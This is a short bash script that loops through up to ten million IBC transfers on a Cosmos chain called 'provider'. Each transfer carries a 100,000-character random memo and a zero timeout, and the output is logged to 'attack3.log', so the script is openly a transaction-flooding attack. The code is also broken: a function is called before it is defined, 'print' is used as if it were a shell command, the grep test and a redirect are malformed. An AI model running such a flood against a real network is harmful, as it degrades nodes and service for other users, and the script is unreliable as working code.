set -ue

# get sequence number 
sequence () {

SEQUENCE=$(curl http://127.0.0.1:1317/cosmos/auth/v1beta1/accounts/cosmos18hmramafeyg3xu3j8m6s4w38sgt93r29v7c8d5 | jq --raw-output ' .account.sequence ')
print $SEQUENCE

}


# get seqwuence number before entering main loop
sequence
loop


# main loop
loop () {
for i in $( eval echo {"$SEQUENCE"..10000000} )

do

	gaiad tx ibc-transfer transfer transfer channel-58 cosmos18hmramafeyg3xu3j8m6s4w38sgt93r29v7c8d5 1uatom --from test3 --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas 1109809 --yes --fees 2775uatom --sequence $i  --packet-timeout-timestamp 0 &2> attack3.log

	# get sequence number if we've had an account sequence mismatch
	if [ grep -q expected attack3.log ] 

	then
		print "sequence mismatch at $i, getting new sequence number"
		sequence
	fi

done
}
